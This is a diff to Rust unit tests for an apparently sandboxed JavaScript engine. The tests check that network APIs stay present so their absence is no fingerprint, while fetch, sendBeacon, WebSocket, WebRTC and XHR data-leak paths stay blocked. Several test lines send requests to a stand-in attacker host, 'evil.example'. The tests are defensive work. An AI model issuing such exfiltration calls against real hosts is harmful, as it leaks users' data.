@@ -237,13 +237,51 @@ mod tests {
     }
 
     #[test]
-    fn no_network_or_dom_apis_exist_in_the_cage() {
+    fn network_exfil_is_gated() {
         let mut e = engine();
-        // The bare cage exposes none of these — they are simply undefined.
-        assert!(e.execute_simple("typeof fetch").unwrap() == "undefined");
-        assert!(e.execute_simple("typeof XMLHttpRequest").unwrap() == "undefined");
-        assert!(e.execute_simple("typeof document").unwrap() == "undefined");
-        assert!(e.execute_simple("typeof WebSocket").unwrap() == "undefined");
-        assert!(e.execute_simple("typeof localStorage").unwrap() == "undefined");
+        // Present, so their *absence* isn't itself a fingerprint (they match a
+        // mainstream browser's surface)...
+        assert_eq!(e.execute_simple("typeof fetch").unwrap(), "function");
+        assert_eq!(e.execute_simple("typeof XMLHttpRequest").unwrap(), "function");
+        assert_eq!(e.execute_simple("typeof WebSocket").unwrap(), "function");
+        assert_eq!(e.execute_simple("typeof RTCPeerConnection").unwrap(), "function");
+        assert_eq!(e.execute_simple("typeof navigator.sendBeacon").unwrap(), "function");
+
+        // ...but every exfil path is denied.
+        // fetch → a rejected Promise (looks like a blocked/failed request).
+        assert_eq!(
+            e.execute_simple("Object.prototype.toString.call(fetch('https://evil.example/'))")
+                .unwrap(),
+            "[object Promise]"
+        );
+        // sendBeacon → false ("not queued"), no data leaves.
+        assert_eq!(
+            e.execute_simple("navigator.sendBeacon('https://evil.example/', 'x')")
+                .unwrap(),
+            "false"
+        );
+        // WebSocket and WebRTC construction is blocked (no socket, no ICE => no
+        // local-IP leak).
+        assert!(e.execute_simple("new WebSocket('wss://evil.example/')").is_err());
+        assert!(e.execute_simple("new RTCPeerConnection()").is_err());
+        // XHR is present but inert: send() issues nothing, status stays 0.
+        assert_eq!(
+            e.execute_simple(
+                "var x = new XMLHttpRequest(); x.open('GET','https://evil.example/'); \
+                 x.send(); x.status"
+            )
+            .unwrap(),
+            "0"
+        );
+    }
+
+    #[test]
+    fn dom_and_storage_apis_are_not_yet_exposed() {
+        let mut e = engine();
+        // DOM bindings (future) and storage (M6) are not bound yet — undefined.
+        assert_eq!(e.execute_simple("typeof document").unwrap(), "undefined");
+        assert_eq!(e.execute_simple("typeof localStorage").unwrap(), "undefined");
+        assert_eq!(e.execute_simple("typeof sessionStorage").unwrap(), "undefined");
+        assert_eq!(e.execute_simple("typeof indexedDB").unwrap(), "undefined");
     }
 }
